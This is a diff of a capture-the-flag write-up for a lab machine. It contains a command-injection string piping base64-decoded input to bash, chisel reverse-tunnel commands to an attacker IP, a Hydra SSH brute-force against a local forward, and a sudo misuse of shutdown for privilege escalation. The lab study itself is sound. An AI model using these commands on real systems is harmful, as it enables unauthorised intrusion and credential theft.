@@ -78,7 +78,7 @@ This action is successful:
 
 ![YoF Python Server](yof-python-server.png)
 
-Another comand injection script `\";echo d2hvYW1p | base64 -d | bash \n`
+Another comand injection script `\";echo d2hvYW1p | base64 -d | bash \n`:
 ![YoF Command Injection](yof-command-injection-whoami.png)
 
 We can now create a file called "revshell.sh" and insert the below payload for getting a reverse shell:
@@ -101,9 +101,9 @@ SSH is running locally so we can move chisel to the target machine and forward t
 1. Edit proxychains.conf `socks 127.0.0.1 9999`:
 
 	![YoF Proxchains Conf](yof-proxchains-conf.png)
-2. Run the following on the local machine `./chisel_1.7.6_linux_amd64 server --socks5 -p 1111 --reverse`
+2. Run the following on the local machine `./chisel_1.7.6_linux_amd64 server --socks5 -p 1111 --reverse`:
 	![YoF Chisel Server](yof-chisel-server.png)
-3. Run the following on target machine `./chisel_1.7.6_linux_amd64 client 10.13.6.172:1111 R:9999:127.0.0.1:22`
+3. Run the following on target machine `./chisel_1.7.6_linux_amd64 client 10.13.6.172:1111 R:9999:127.0.0.1:22`:
 	![YoF Chisel Client](yof-chisel-client.png)
   
 We can then try to brute force the SSH service with Hydra `hydra -l fox -P /usr/share/wordlists/rockyou.txt ssh://127.0.0.1:9999 -v -f`:
@@ -121,7 +121,8 @@ We can now SSH into the server with above credentials `ssh -p 9999 fox@127.0.0.1
 It looks like fox user could run "/usr/sbin/shutdown" as root without any passwords:
 ![YoF FOX Sudo](yof-fox-sudo-l.png)
 
-We then transfer "/usr/sbin/shutdown" to my local Kali machine and inspected it with `strings shutdown`
+We then transfer "/usr/sbin/shutdown" to my local Kali machine and inspected it with `strings shutdown`:
+
 ![YoF Strings](yof-strings-shutdown.png)
 
 Next we copy "/bin/bash" to "/tmp"
